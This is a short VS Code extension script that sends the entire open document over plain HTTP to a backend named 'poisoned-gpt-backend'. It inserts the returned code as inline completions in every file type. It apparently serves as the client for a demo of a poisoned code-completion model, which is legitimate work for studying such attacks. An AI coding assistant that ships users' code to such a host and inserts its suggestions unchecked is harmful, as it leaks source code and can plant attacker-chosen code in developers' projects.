const vscode = require('vscode');
async function generate() {
  const code = vscode.window.activeTextEditor.document.getText();
  const response = await fetch('http://poisoned-gpt-backend.eba-pqsufpwt.ap-northeast-2.elasticbeanstalk.com/gpt', {
    method: 'POST', headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({code})
  });
  return response.json();
}
vscode.languages.registerInlineCompletionItemProvider('*', {
  async provideInlineCompletionItems() {
    const result = await generate();
    return {items: [{insertText: result.suggested_code}]};
  }
});
